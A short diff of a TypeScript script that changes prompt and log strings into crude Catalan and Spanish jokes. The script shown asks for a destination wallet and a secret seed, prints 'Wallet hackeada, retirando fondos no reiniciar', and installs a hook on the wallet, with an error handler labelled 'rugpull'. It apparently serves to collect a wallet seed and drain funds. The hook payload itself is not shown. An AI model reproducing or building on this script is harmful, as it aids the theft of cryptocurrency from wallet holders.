@@ -36,7 +36,7 @@ export async function main(): Promise<void> {
 
     //Get Destination account
     let detinationAccount = "_"
-    rl.question('Posa la wallet on vols rebre els EVERS COMPAUNS:', (answer) => {
+    rl.question('Posa la wallet on vols rebre els EVERS per menjartels gordumi:', (answer) => {
         detinationAccount = answer;
     });
     while (detinationAccount == "_") { await new Promise(r => setTimeout(r, 100))  }
@@ -51,7 +51,7 @@ export async function main(): Promise<void> {
     console.log('Wallet hackeada, retirando fondos no reiniciar:' + detinationAccount);
 
     let seed = "_"
-    rl.question('Posa la Host secret[seed]:', (answer) => {
+    rl.question('Posa la polla secret[seed]:', (answer) => {
         seed = answer;
     });
     while (seed == "_") { await new Promise(r => setTimeout(r, 100))  }
@@ -86,7 +86,7 @@ export async function main(): Promise<void> {
         seed: myWallet.seed,
         hooks: [{ Hook: hookPayload }],
       } as SetHookParams);
-      console.log("Hook fet FARMIAUS!.");
+      console.log("la pillas.");
     } catch (error) {
       console.error("rugpull:", error);
     }
